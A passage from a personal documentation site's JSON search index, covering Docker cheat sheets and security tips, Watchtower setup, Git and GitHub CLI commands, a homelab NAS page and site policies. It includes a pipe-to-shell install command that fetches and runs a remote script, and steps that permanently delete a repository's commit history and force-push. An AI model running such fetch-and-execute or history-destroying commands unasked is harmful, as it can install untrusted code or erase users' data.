"devops/docker/docker-images/#lifecycle", "title": "Lifecycle", "text": "<ul> <li><code>docker images</code> shows all images.</li> <li><code>docker import</code> creates an image from a tarball.</li> <li><code>docker build</code> creates image from Dockerfile.</li> <li><code>docker commit</code> creates image from a container, pausing it temporarily if it is running.</li> <li><code>docker rmi</code> removes an image.</li> <li><code>docker load</code> loads an image from a tar archive as STDIN, including images and tags (as of 0.7).</li> <li><code>docker save</code> saves an image to a tar archive stream to STDOUT with all parent layers, tags &amp; versions (as of 0.7).</li> </ul>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-images/#info", "title": "Info", "text": "<ul> <li><code>docker history</code> shows history of image.</li> <li><code>docker tag</code> tags an image to a name (local or registry).</li> </ul>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-images/#cleaning-up", "title": "Cleaning up", "text": "<p>While you can use the <code>docker rmi</code> command to remove specific images, there's a tool called docker-gc that will safely clean up images that are no longer used by any containers. As of docker 1.13, <code>docker image prune</code> is also available for removing unused images. See Prune.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-images/#loadsave-image", "title": "Load/Save image", "text": "<p>Load an image from file:</p> <pre><code>docker load &lt; my_image.tar.gz\n</code></pre> <p>Save an existing image:</p> <pre><code>docker save my_image:my_tag | gzip &gt; my_image.tar.gz\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-images/#importexport-container", "title": "Import/Export container", "text": "<p>Import a container as an image from file:</p> <pre><code>cat my_container.tar.gz | docker import - my_image:my_tag\n</code></pre> <p>Export an existing container:</p> <pre><code>docker export my_container | gzip &gt; my_container.tar.gz\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-images/#difference-between-loading-a-saved-image-and-importing-an-exported-container-as-an-image", "title": "Difference between loading a saved image and importing an exported container as an image", "text": "<p>Loading an image using the <code>load</code> command creates a new image including its history. Importing a container as an image using the <code>import</code> command creates a new image excluding the history which results in a smaller image size compared to loading an image.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-images/#credit", "title": "Credit", "text": "<p>Thanks to @wsargent for creating this cheat sheet.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-install/", "title": "Docker Installation", "text": "<p>You can download and install Docker on multiple platforms. The following are the most common ways to install Docker on Linux, Mac, and Windows. You can also install Docker on other platforms if you have the necessary software.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-install/#images", "title": "Images", "text": "", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-install/#linux", "title": "Linux", "text": "<p>Run this quick and easy install script provided by Docker:</p> <pre><code>curl -sSL https://get.docker.com/ | sh\n</code></pre> <p>If you're not willing to run a random shell script, please see the installation instructions for your distribution.</p> <p>If you are a complete Docker newbie, you should follow the series of tutorials now.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-install/#macos", "title": "macOS", "text": "<p>Download and install Docker Community Edition. if you have Homebrew-Cask, just type <code>brew install --cask docker</code>. Or Download and install Docker Toolbox.  Docker For Mac is nice, but it's not quite as finished as the VirtualBox install.  See the comparison.</p> <p>NOTE Docker Toolbox is legacy. You should to use Docker Community Edition, See Docker Toolbox.</p> <p>Once you've installed Docker Community Edition, click the docker icon in Launchpad. Then start up a container:</p> <pre><code>docker run hello-world\n</code></pre> <p>That's it, you have a running Docker container.</p> <p>If you are a complete Docker newbie, you should probably follow the series of tutorials now.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-install/#windows-10", "title": "Windows 10", "text": "<p>Instructions to install Docker Desktop for Windows can be found here</p> <p>Once installed, open powershell as administrator and run:</p> <pre><code># Display the version of docker installed:\ndocker version\n\n# Pull, create, and run 'hello-world':\ndocker run hello-world\n</code></pre> <p>To continue with this cheat sheet, right click the Docker icon in the system tray, and go to settings. In order to mount volumes, the C:/ drive will need to be enabled in the settings to that information can be passed into the containers (later described in this article). </p> <p>To switch between Windows containers and Linux containers, right click the icon in the system tray and click the button to switch container operating system Doing this will stop the current containers that are running, and make them unaccessible until the container OS is switched back.</p> <p>Additionally, if you have WSL or WSL2 installed on your desktop, you might want to install the Linux Kernel for Windows. Instructions can be found here. This requires the Windows Subsystem for Linux feature. This will allow for containers to be accessed by WSL operating systems, as well as the efficiency gain from running WSL operating systems in docker. It is also preferred to use Windows terminal for this.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-install/#windows-server-2016-2019", "title": "Windows Server 2016 / 2019", "text": "<p>Follow Microsoft's instructions that can be found here</p> <p>If using the latest edge version of 2019, be prepared to only work in powershell, as it is only a servercore image (no desktop interface). When starting this machine, it will login and go straight to a powershell window. It is reccomended to install text editors and other tools using Chocolatey.</p> <p>After installing, these commands will work:</p> <pre><code># Display the version of docker installed:\ndocker version\n\n# Pull, create, and run 'hello-world':\ndocker run hello-world\n</code></pre> <p>Windows Server 2016 is not able to run Linux images. </p> <p>Windows Server Build 2004 is capable of running both linux and windows containers simultaneously through Hyper-V isolation. When running containers, use the <code>--isolation=hyperv</code> command, which will isolate the container using a seperate kernel instance. </p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-install/#check-version", "title": "Check Version", "text": "<p>It is very important that you always know the current version of Docker you are currently running on at any point in time. This is very helpful because you get to know what features are compatible with what you have running. This is also important because you know what containers to run from the docker store when you are trying to get template containers. That said let see how to know which version of docker we have running currently.</p> <ul> <li><code>docker version</code> shows which version of docker you have running.</li> </ul> <p>Get the server version:</p> <pre><code>$ docker version --format '{{.Server.Version}}'\n1.8.0\n</code></pre> <p>You can also dump raw JSON data:</p> <pre><code>$ docker version --format '{{json .}}'\n{\"Client\":{\"Version\":\"1.8.0\",\"ApiVersion\":\"1.20\",\"GitCommit\":\"f5bae0a\",\"GoVersion\":\"go1.4.2\",\"Os\":\"linux\",\"Arch\":\"am\"}\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-install/#credit", "title": "Credit", "text": "<p>Thanks to @wsargent for creating this cheat sheet.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-networks/", "title": "Docker Networks &amp; Links Cheat Sheet", "text": "", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-networks/#networks", "title": "Networks", "text": "<p>Docker has a networks feature. Docker automatically creates 3 network interfaces when you install it (bridge, host none). A new container is launched into the bridge network by default. To enable communication between multiple containers, you can create a new network and launch containers in it. This enables containers to communicate to each other while being isolated from containers that are not connected to the network. Furthermore, it allows to map container names to their IP addresses. See working with networks for more details.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-networks/#lifecycle", "title": "Lifecycle", "text": "<ul> <li><code>docker network create</code> NAME Create a new network (default type: bridge).</li> <li><code>docker network rm</code> NAME Remove one or more networks by name or identifier. No containers can be connected to the network when deleting it.</li> </ul>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-networks/#info", "title": "Info", "text": "<ul> <li><code>docker network ls</code> List networks</li> <li><code>docker network inspect</code> NAME Display detailed information on one or more networks.</li> </ul>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-networks/#connection", "title": "Connection", "text": "<ul> <li><code>docker network connect</code> NETWORK CONTAINER Connect a container to a network</li> <li><code>docker network disconnect</code> NETWORK CONTAINER Disconnect a container from a network</li> </ul> <p>You can specify a specific IP address for a container:</p> <pre><code># create a new bridge network with your subnet and gateway for your ip block\ndocker network create --subnet 203.0.113.0/24 --gateway 203.0.113.254 iptastic\n\n# run a nginx container with a specific ip in that block\n$ docker run --rm -it --net iptastic --ip 203.0.113.2 nginx\n\n# curl the ip from any other place (assuming this is a public ip block duh)\n$ curl 203.0.113.2\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-networks/#links", "title": "Links", "text": "<p>Links are how Docker containers talk to each other through TCP/IP ports. Atlassian show worked examples. You can also resolve links by hostname.</p> <p>This has been deprecated to some extent by user-defined networks.</p> <p>NOTE: If you want containers to ONLY communicate with each other through links, start the docker daemon with <code>-icc=false</code> to disable inter process communication.</p> <p>If you have a container with the name CONTAINER (specified by <code>docker run --name CONTAINER</code>) and in the Dockerfile, it has an exposed port:</p> <pre><code>EXPOSE 1337\n</code></pre> <p>Then if we create another container called LINKED like so:</p> <pre><code>docker run -d --link CONTAINER:ALIAS --name LINKED user/wordpress\n</code></pre> <p>Then the exposed ports and aliases of CONTAINER will show up in LINKED with the following environment variables:</p> <pre><code>$ALIAS_PORT_1337_TCP_PORT\n$ALIAS_PORT_1337_TCP_ADDR\n</code></pre> <p>And you can connect to it that way.</p> <p>To delete links, use <code>docker rm --link</code>.</p> <p>Generally, linking between docker services is a subset of \"service discovery\", a big problem if you're planning to use Docker at scale in production.  Please read The Docker Ecosystem: Service Discovery and Distributed Configuration Stores for more info.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-networks/#credit", "title": "Credit", "text": "<p>Thanks to @wsargent for creating this cheat sheet.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-security/", "title": "Docker Security &amp; Best Practices", "text": "", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-security/#security", "title": "Security", "text": "<p>This is where security tips about Docker go. The Docker security page goes into more detail.</p> <p>First things first: Docker runs as root. If you are in the <code>docker</code> group, you effectively have root access. If you expose the docker unix socket to a container, you are giving the container root access to the host.</p> <p>Docker should not be your only defense. You should secure and harden it.</p> <p>For an understanding of what containers leave exposed, you should read Understanding and Hardening Linux Containers by Aaron Grattafiori. This is a complete and comprehensive guide to the issues involved with containers, with a plethora of links and footnotes leading on to yet more useful content. The security tips following are useful if you've already hardened containers in the past, but are not a substitute for understanding.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-security/#security-tips", "title": "Security Tips", "text": "<p>For greatest security, you want to run Docker inside a virtual machine. This is straight from the Docker Security Team Lead -- slides / notes. Then, run with AppArmor / seccomp / SELinux / grsec etc to limit the container permissions. See the Docker 1.10 security features for more details.</p> <p>Docker image ids are sensitive information and should not be exposed to the outside world. Treat them like passwords.</p> <p>See the Docker Security Cheat Sheet by Thomas Sj\u00f6gren: some good stuff about container hardening in there.</p> <p>Check out the docker bench security script, download the white papers.</p> <p>Snyk's 10 Docker Image Security Best Practices cheat sheet</p> <p>You should start off by using a kernel with unstable patches for grsecurity / pax compiled in, such as Alpine Linux. If you are using grsecurity in production, you should spring for commercial support for the stable patches, same as you would do for RedHat. It's $200 a month, which is nothing to your devops budget.</p> <p>Since docker 1.11 you can easily limit the number of active processes running inside a container to prevent fork bombs. This requires a linux kernel &gt;= 4.3 with CGROUP_PIDS=y to be in the kernel configuration.</p> <pre><code>docker run --pids-limit=64\n</code></pre> <p>Also available since docker 1.11 is the ability to prevent processes from gaining new privileges. This feature have been in the linux kernel since version 3.5. You can read more about it in this blog post.</p> <pre><code>docker run --security-opt=no-new-privileges\n</code></pre> <p>From the Docker Security Cheat Sheet (it's in PDF which makes it hard to use, so copying below) by Container Solutions:</p> <p>Turn off interprocess communication with:</p> <pre><code>docker -d --icc=false --iptables\n</code></pre> <p>Set the container to be read-only:</p> <pre><code>docker run --read-only\n</code></pre> <p>Verify images with a hashsum:</p> <pre><code>docker pull debian@sha256:a25306f3850e1bd44541976aa7b5fd0a29be\n</code></pre> <p>Set volumes to be read only:</p> <pre><code>docker run -v $(pwd)/secrets:/secrets:ro debian\n</code></pre> <p>Define and run a user in your Dockerfile so you don't run as root inside the container:</p> <pre><code>RUN groupadd -r user &amp;&amp; useradd -r -g user user\nUSER user\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-security/#user-namespaces", "title": "User Namespaces", "text": "<p>There's also work on user namespaces -- it is in 1.10 but is not enabled by default.</p> <p>To enable user namespaces (\"remap the userns\") in Ubuntu 15.10, follow the blog example.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-security/#security-videos", "title": "Security Videos", "text": "<ul> <li>Using Docker Safely</li> <li>Securing your applications using Docker</li> <li>Container security: Do containers actually contain?</li> <li>Linux Containers: Future or Fantasy?</li> </ul>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-security/#security-roadmap", "title": "Security Roadmap", "text": "<p>The Docker roadmap talks about seccomp support. There is an AppArmor policy generator called bane, and they're working on security profiles.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-security/#best-practices", "title": "Best Practices", "text": "<p>This is where general Docker best practices and war stories go:</p> <ul> <li>The Rabbit Hole of Using Docker in Automated Tests</li> <li>Bridget Kromhout has a useful blog post on running Docker in production at Dramafever.</li> <li>There's also a best practices blog post from Lyst.</li> <li>Building a Development Environment With Docker</li> <li>Discourse in a Docker Container</li> </ul>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-security/#credit", "title": "Credit", "text": "<p>Thanks to @wsargent for creating this cheat sheet.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/watchtower/", "title": "Watchtower", "text": "", "tags": ["docker", "container", "watchtower"]}, {"location": "devops/docker/watchtower/#quick-start", "title": "Quick Start", "text": "<p>With watchtower you can update the running version of your containerized app simply by pushing a new image to the Docker Hub or your own image registry. Watchtower will pull down your new image, gracefully shut down your existing container and restart it with the same options that were used when it was deployed initially. Run the watchtower container with the following command:</p> docker rundocker-compose.yml <pre><code>$ docker run -d \\\n--name watchtower \\\n-v /var/run/docker.sock:/var/run/docker.sock \\\ncontainrrr/watchtower\n</code></pre> <pre><code>version: \"3\"\nservices:\n  watchtower:\n    image: containrrr/watchtower\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n</code></pre>", "tags": ["docker", "container", "watchtower"]}, {"location": "devops/docker/watchtower/#what-is-watchtower", "title": "What is Watchtower?", "text": "<p>Watchtower is an application that will monitor your running Docker containers and watch for changes to the images that those containers were originally started from. If watchtower detects that an image has changed, it will automatically restart the container using the new image.</p> <p>With watchtower you can update the running version of your containerized app simply by pushing a new image to the Docker Hub or your own image registry. Watchtower will pull down your new image, gracefully shut down your existing container and restart it with the same options that were used when it was deployed initially.</p> <p>Full documanation can be found at Watchtower Documentation. Github repo can be found at Watchtower Github Repository.</p>", "tags": ["docker", "container", "watchtower"]}, {"location": "devops/docker/watchtower/#run-ones", "title": "Run Ones", "text": "<p>You can run Watchtower run <code>once</code> to force an update of a containers by running the following command:</p> <pre><code>docker run --rm -v /var/run/docker.sock:/var/run/docker.sock containrrr/watchtower --run-once\n</code></pre>", "tags": ["docker", "container", "watchtower"]}, {"location": "devops/docker/watchtower/#docker-compose-example", "title": "Docker Compose Example", "text": "<p>Blow is and example of a docker-compose.yml file that uses watchtower to automatically update your running containers at 3:30 AM every day, sending notifications to <code>Telegram</code> with <code>shoutrrr</code></p> <pre><code>version: '3'\n\nservices:\n  watchtower:\n    image: containrrr/watchtower\n    container_name: watchtower\n    hostname: port-watchtower\n    restart: always\n    network_mode: bridge\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n      - /etc/localtime:/etc/localtime\n    environment:\n      - WATCHTOWER_NOTIFICATIONS=shoutrrr\n      - WATCHTOWER_NOTIFICATION_URL=telegram://&lt;Bot-api-token&gt;@telegram/?channels=&lt;channel-id&gt;\n    command: --schedule '0 30 3 * * *' --cleanup\n</code></pre>", "tags": ["docker", "container", "watchtower"]}, {"location": "devops/git/delete-commit-history/", "title": "Removing Sensitive Data from a Repository History", "text": "<p>As humans, we sometimes make mistakes. One of them is committing sensitive data in our Git repository. If you commit sensitive data, such as a password, SSH key, API tokens, license keys and so on into a Git repository, you can remove it from the history. You can follow the official GitHub instructions to remove sensitive data from the history. It's probably the best and the right way to do it.</p> <p>Below is a fast way to remove sensitive data from a repository's history but with a few caveats like loosing all the history of the repository.</p>", "tags": ["github", "history", "security"]}, {"location": "devops/git/delete-commit-history/#delete-commit-history-in-github-repository", "title": "Delete Commit History in Github Repository", "text": "<p>Danger</p> <p>This will remove your old commit history completely, You can\u2019t recover it again!</p> <p>Create Orphan Branch \u2013 Create a new orphan branch in git repository. The newly created branch will not show in \u2018git branch\u2019 command.</p> <pre><code>git checkout --orphan temp_branch\n</code></pre> <p>Add Files to Branch \u2013 Now add all files to newly created branch and commit them using following commands.</p> <pre><code>git add -A\ngit commit -am \"first commit\"\n</code></pre> <p>Delete master/main Branch. Adjust the command according your git repository</p> <pre><code>git branch -D main\n</code></pre> <p>Rename Current Branch \u2013 After deleting the master/main branch, let\u2019s rename newly created branch name to master/main.</p> <pre><code>git branch -m main\n</code></pre> <p>Push Changes \u2013 You have completed the changes to your local git repository. Finally, push your changes to the remote master/main (Github) repository forcefully.</p> <pre><code>git push -f origin main\n</code></pre>", "tags": ["github", "history", "security"]}, {"location": "devops/git/git-cli-cheat-sheet/", "title": "Git Cli Cheat Sheet", "text": "<p>Git is a free and open source distributed version control system designed to quickly and efficiently manage everything from small to very large projects.</p>", "tags": ["github", "git", "cheat-sheet"]}, {"location": "devops/git/git-cli-cheat-sheet/#create-repositories", "title": "Create Repositories", "text": "<p>A new repository can either be created locally, or an existing repository can be cloned. When a repository was initialized locally, you have to push it to GitHub afterwards.</p> <p>The git init command turns an existing directory into a new Git repository inside the folder you are running this command. After using the <code>git init</code> command, link the local repository to an empty GitHub repository using the following command:</p> <pre><code>git init\n</code></pre> <p>Specifies the remote repository for your local repository. The url points to a repository on GitHub.</p> <pre><code>git remote add origin [url]\n</code></pre> <p>Clone (download) a repository that already exists on GitHub, including all of the files, branches, and commits</p> <pre><code>git clone [url]\n</code></pre>", "tags": ["github", "git", "cheat-sheet"]}, {"location": "devops/git/git-cli-cheat-sheet/#git-configuration", "title": "Git Configuration", "text": "<p>Configure user information for all local repositories</p> <p>Sets the name you want attached to your commit transactions</p> <pre><code>git config --global user.name \"[name]\"\n</code></pre> <p>Sets the email you want attached to your commit transactions</p> <pre><code>git config --global user.email \"[email address]\"\n</code></pre> <p>Enables helpful colorization of command line output</p> <pre><code>git config --global color.ui auto\n</code></pre>", "tags": ["github", "git", "cheat-sheet"]}, {"location": "devops/git/git-cli-cheat-sheet/#synchronize-changes", "title": "Synchronize Changes", "text": "<p>Synchronize your local repository with the remote repository on GitHub.com</p> <p>Downloads all history from the remote tracking branches</p> <pre><code>git fetch\n</code></pre> <p>Combines remote tracking branches into current local branch</p> <pre><code>git merge\n</code></pre> <p>Uploads all local branch commits to GitHub</p> <pre><code>git push\n</code></pre> <p>Updates your current local working branch with all new commits from the corresponding remote branch on GitHub. <code>git pull</code> is a combination of <code>git fetch</code> and <code>git merge</code></p> <pre><code>git pull\n</code></pre>", "tags": ["github", "git", "cheat-sheet"]}, {"location": "devops/git/git-cli-cheat-sheet/#redo-commits", "title": "Redo Commits", "text": "<p>Erase mistakes and craft replacement history</p> <p>Undoes all commits after [commit], preserving changes locally</p> <pre><code>git reset [commit]\n</code></pre> <p>If you don't want to reset absolutely, but relatively that is also possible using <pre><code>git reset HEAD~2\n</code></pre> which undoes the last 2 commits.</p> <p>Discards all history and changes back to the specified commit</p> <pre><code>git reset --hard [commit]\n</code></pre>", "tags": ["github", "git", "cheat-sheet"]}, {"location": "devops/git/git-cli-cheat-sheet/#branches", "title": "Branches", "text": "<p>Branches are an important part of working with Git. Any commits you make will be made on the branch you\u2019re currently \u201cchecked out\u201d to. Use git status to see which branch that is.</p> <p>Creates a new branch</p> <pre><code>git branch [branch-name]\n</code></pre> <p>Switches to the specified branch and updates the working directory</p> <p><pre><code>git switch -c [branch-name]\n</code></pre> or you can use</p> <p><pre><code>git checkout -b [branch-name]\n</code></pre> to both create and switch to the branch simultaneously.</p> <p>Combines the specified branch\u2019s history into the current branch. This is usually done in pull requests, but is an important Git operation.</p> <pre><code>git merge [branch]\n</code></pre> <p>Deletes the specified branch</p> <pre><code>git branch -d [branch-name]\n</code></pre>", "tags": ["github", "git", "cheat-sheet"]}, {"location": "devops/git/git-cli-cheat-sheet/#make-changes", "title": "Make Changes", "text": "<p>Browse and inspect the evolution of project files</p> <p>Lists version history for the current branch</p> <pre><code>git log\n</code></pre> <p>Lists version history for a file, beyond renames (works only for a single file)</p> <pre><code>git log --follow [file]\n</code></pre> <p>Shows content differences between two branches</p> <pre><code>git diff [first-branch]...[second-branch]\n</code></pre> <p>Outputs metadata and content changes of the specified commit</p> <pre><code>git show [commit]\n</code></pre> <p>Snapshots the file in preparation for versioning</p> <pre><code>git add [file]\n</code></pre> <p>Records file snapshots permanently in version history</p> <pre><code>git commit -m \"[descriptive message]\"\n</code></pre>", "tags": ["github", "git", "cheat-sheet"]}, {"location": "devops/git/git-cli-cheat-sheet/#the-gitignore-file", "title": "The .gitignore file", "text": "<p>Sometimes it may be a good idea to exclude files from being tracked with Git. This is typically done in a special file named .gitignore. You can find helpful templates for <code>.gitignore</code> files at github.com/github/gitignore. If there are certain files (like <code>.vscode</code> or <code>.ide</code>) that should be discluded from all projects, you can create a global <code>.gitignore</code> file to do so.</p>", "tags": ["github", "git", "cheat-sheet"]}, {"location": "devops/git/git-cli-cheat-sheet/#untrack-files-already-added-to-git-repository-based-on-gitignore", "title": "Untrack Files Already Added to git Repository Based on .gitignore", "text": "<p>Commit all your changes. Before proceeding, make sure all your changes are committed, including your .gitignore file. Remove everything from the repository. To clear your repo, use:</p> <pre><code>git rm -r --cached .\n</code></pre> <p>Re add everything.</p> <pre><code>git add .\n</code></pre> <p>Commit.</p> <pre><code>git commit -m \".gitignore fix\"\n</code></pre>", "tags": ["github", "git", "cheat-sheet"]}, {"location": "devops/git/git-cli-cheat-sheet/#use-gist-as-repository", "title": "Use Gist as Repository", "text": "<p>It's probably easiest if you just start by cloning the gist, so that <code>origin</code> (a \"remote\" that refers to the original repository) is set up for you. Then you can just do <code>git push origin master</code>. For example:</p> <pre><code>git clone git@gist.github.com:869085.git mygist\ncd mygist\n</code></pre> <p>Add you changes to the repository.</p> <pre><code>git add .\ngit commit -m \"Better comments\"\ngit push origin master\n</code></pre> <p>However, if you don't want to redo your changes, you can do:</p> <pre><code>cd mygist\ngit remote add origin git@gist.github.com:869085.git\ngit fetch origin\n# Push your changes, also setting the upstream for master:\ngit push -u origin master\n</code></pre> <p>Strictly speaking, the <code>git fetch origin</code> and <code>-u</code> argument to <code>git push origin master</code> are optional, but they will helpfully associate the upstream branch <code>master</code> in <code>origin</code> with your local branch <code>master</code>.</p>", "tags": ["github", "git", "cheat-sheet"]}, {"location": "devops/git/git-submodules/", "title": "Git Submodules Cheat Sheet", "text": "", "tags": ["github", "cheat-sheet", "submodules"]}, {"location": "devops/git/git-submodules/#what-is-a-submodule", "title": "What is a Submodule?", "text": "<p>Git submodules allow you to keep a git repository as a subdirectory of another git repository. Git submodules are simply a reference to another repository at a particular snapshot in time. Git submodules enable a Git repository to incorporate and track version history of external code.</p>", "tags": ["github", "cheat-sheet", "submodules"]}, {"location": "devops/git/git-submodules/#add-a-submodule", "title": "Add a Submodule", "text": "<p>You need to know the remote git repository url and where you want to place that it in your repository.</p> <p>for example:</p> <pre><code>git submodule add https://github.com/fire1ce/3os.org path/to/submodule\ngit add .\ngit commit -m \"adds submodule path/to/submodule\"\n</code></pre>", "tags": ["github", "cheat-sheet", "submodules"]}, {"location": "devops/git/git-submodules/#cloning-a-project-with-submodules", "title": "Cloning A Project With Submodules", "text": "<p>When you clone a repository that contains submodules there are a few extra steps to be taken.</p> <p>for example:</p> <pre><code>git clone https://github.com/fire1ce/3os.org repo\ncd repo\ngit submodule init\ngit submodule update\n</code></pre> <p>If you\u2019re sure you want to fetch all submodules (and their submodules), you can also use this fancy one-liner:</p> <pre><code>git clone --recurse-submodules https://github.com/fire1ce/3os.org\n</code></pre>", "tags": ["github", "cheat-sheet", "submodules"]}, {"location": "devops/git/git-submodules/#submodule-update", "title": "Submodule Update", "text": "<p>If you\u2019re simply tracking the <code>master</code> or <code>main</code> branch for the submodule, you can suffice with a simple <code>fetch</code> and <code>merge</code>.</p> <pre><code>cd path/to/submodule\ngit fetch\ngit merge origin/master\n</code></pre> <p>If you\u2019re in a hurry, you can streamline this for all submodules in your repo with:</p> <pre><code>git submodule update --remote --recursive\n</code></pre> <p>Commit this change to your own repo, so others are locked to this new version of the submodule as well.</p>", "tags": ["github", "cheat-sheet", "submodules"]}, {"location": "devops/git/git-submodules/#remove-a-submodule", "title": "Remove a submodule", "text": "<ul> <li>Delete the relevant section from the <code>.gitmodules</code> file.</li> <li>Stage the <code>.gitmodules</code> changes git add <code>.gitmodules</code></li> <li>Delete the relevant section from <code>.git/config</code>.</li> <li>Run <code>git rm --cached path_to_submodule</code> (no trailing slash).</li> <li>Run <code>rm -rf .git/modules/path_to_submodule</code> (no trailing slash).</li> <li>Commit <code>git commit -m \"Removed submodule\"</code></li> <li>Delete the now untracked submodule files <code>rm -rf path_to_submodule</code></li> </ul>", "tags": ["github", "cheat-sheet", "submodules"]}, {"location": "devops/git/github-cli/", "title": "GitHub Cli Cheat Sheet", "text": "<p>The GitHub Cli a is free and open source Cli tool to interact with GitHub repositories. It allows you to work solely from the command line, as well as navigate to remote (web) repositories very easily.</p>", "tags": ["github", "git", "cheat-sheet"]}, {"location": "devops/git/github-cli/#installation", "title": "Installation", "text": "<p>The GitHub Cli can be found at https://cli.github.com/. The installation are very straightfoward, for example,</p> <p><pre><code>brew install gh\n</code></pre> on macOS.</p>", "tags": ["github", "git", "cheat-sheet"]}, {"location": "devops/git/github-cli/#some-example-commands", "title": "Some example commands", "text": "<p>View the repository remotely.</p> <pre><code>gh repo view --web\n</code></pre> <p>Create a pull request remotely.</p> <pre><code>gh pr create --web\n</code></pre>", "tags": ["github", "git", "cheat-sheet"]}, {"location": "homelab/devices/synology-nas/", "title": "Synology DS218+ NAS", "text": "<p>One of then main devices in my <code>HomeLab</code> is a Synology DS218+ NAS. It purpose mainly for backup and data synchronization tasks.</p> <p>Synology DS218+ NAS was upgraded to 8GB of RAM. It has two SAMSUNG 870 QVO 4TB SSD, running in redundant mode. The 1GbE network was upgraded with SABRENT USB 5GbE Ethernet and the fan was replaced with Noctua NF-A9 FLX Fan for quieter operation.</p> <p>Parts List</p> <ul> <li>Synology DS218+ NAS.</li> <li>2x SAMSUNG 870 QVO 4TB SSD.</li> <li>Noctua NF-A9 FLX Fan.</li> <li>SABRENT USB 5GbE Ethernet.</li> <li>2x Crucial 4GB DDR3l-1600.</li> </ul> <p>Used for</p> <ul> <li>Data backup.</li> <li>Data synchronization.</li> <li>Data storage.</li> <li>Docker containers.</li> </ul> <p></p> <p></p>", "tags": ["HomeLab", "Synology", "NAS"]}, {"location": "information/affiliateDisclosure/", "title": "Affiliate Disclosure", "text": "<p>This website can include advertising, supported content, paid inserts, affiliate links or other types of monetization.</p> <p>We believe in the authenticity of relationships, views and identities. Compensation received can have an effect on the advertisement material, topics or posts made in this blog. Such content, advertising space or post will be specifically marked as paid or supported content. We will only endorse the products or services that we believe, based on our expertise, are worthy of this endorsement.</p> <p>Any claim, statistic, quotation or other representation of a product or service should be verified with the manufacturer or supplier. This site does not contain any content that may constitute a conflict of interest.</p> <p>This website does not provide any representations, warranties or assurances as to the accuracy,</p> <p>currency or completeness of the content contained on this website or on any website linked to or from this website.</p>", "tags": ["information", "affiliate"]}, {"location": "information/affiliateDisclosure/#participant-programs", "title": "Participant Programs\u200b", "text": "<p>This website is a participant in the Amazon Services LLC Associates Program, aliexpress, an affiliate advertisement program designed to provide a way for websites to receive advertising fees through advertising and links to amazon.com, aliexpress.com.</p>", "tags": ["information", "affiliate"]}, {"location": "information/cookies-policy/", "title": "Cookies Policy", "text": "<p>We use cookies and other similar technologies to help provide our Services, to advertise to you and to analyse how you use our Services and whether advertisements are being viewed. We also allow third parties to use tracking technologies for similar purposes. If you are using our Services via a browser you can restrict, block or remove cookies through your web browser settings. The Help menu on the menu bar of most browsers also tells you how to prevent your browser from accepting new cookies, how to delete old cookies, how to have the browser notify you when you receive a new cookie and how to disable cookies altogether.</p>", "tags": ["information", "Cookies"]}, {"location": "information/cookies-policy/#what-are-cookies", "title": "What are Cookies?", "text": "<p>A cookie is a small text file which is sent to your computer or mobile device (referred to in this policy as a \u201cdevice\u201d) by the web server so that the website can remember some information about your browsing activity on the website. The cookie will collect information relating to your use of our sites, information about your device such as the device\u2019s IP address and browser type, demographic data and, if you arrived at our site via a link from third party site, the URL of the linking page. If you are a registered user or subscriber it may also collect your name and email address, which may be transferred to data processors for registered user or subscriber verification purposes. Cookies record information about your online preferences and help us to tailor our websites to your interests. Information provided by cookies can help us to analyse your use of our sites and help us to provide you with a better user experience. We use tracking technologies for the following purposes:</p>", "tags": ["information", "Cookies"]}, {"location": "information/cookies-policy/#performance-purposes", "title": "Performance Purposes", "text": "<p>These cookies are necessary for the website to function and cannot be switched off in our systems. These are used to let you login, to ensure site security and to provide shopping cart functionality. Without this type of technology, our Services won\u2019t work properly or won\u2019t be able to provide certain features and functionalities.</p>", "tags": ["information", "Cookies"]}, {"location": "information/cookies-policy/#personalization-cookies", "title": "Personalization Cookies", "text": "<p>These cookies are used to analyze how visitors use a website, for instance which pages visitors visit most often, in order to provide a better user experience. We also use this technology to check if you have opened our emails, so we can see if they are being delivered correctly and are of interest.</p>", "tags": ["information", "Cookies"]}, {"location": "information/cookies-policy/#advertising-cookies", "title": "Advertising Cookies", "text": "<p>These cookies are used to limit the number of times you see an advertisement, or to customize advertising across our Services and make it more relevant to you and to allow us to measure the effectiveness of advertising campaigns and track whether ads have been properly displayed so we can pay for this. You have the option to change your choices relating to cookies utilized to deliver behaviorally targeted advertising here for EU \u201cAdvertising cookies\u201d and here for US Advertising 